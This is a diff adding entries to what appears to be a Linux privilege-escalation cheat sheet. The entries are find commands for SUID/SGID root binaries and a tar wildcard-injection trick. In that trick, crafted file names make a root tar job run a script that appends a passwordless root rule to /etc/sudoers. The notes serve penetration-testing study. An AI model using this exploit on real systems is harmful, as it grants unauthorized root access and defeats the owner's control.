@@ -186,6 +186,16 @@ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep $USER
 ```
 
+### Find SUID root executables
+```bash
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+```
+
+### Find SGID root executables
+```bash
+find / -uid 0 -perm -6000 -type f 2>/dev/null
+```
+
 ### Find temporary files
 ```bash
 ls -l /tmp /var/tmp /dev/shm
@@ -211,6 +221,14 @@ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a
 - Search for hashes/credentials, often in backups or configs
 
 ## Misc notes
+
+### tar extract wildcard abuse
+File names can be treated as arguments if `tar` is called with `*` like `tar -zcf /home/someone/something.tar.gz *`
+```bash
+echo 'echo "my-user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > exp.sh
+echo "" > "--checkpoint-action=exec=sh exp.sh"
+echo "" > --checkpoint=1
+```
 
 ### .so loading
 ```c
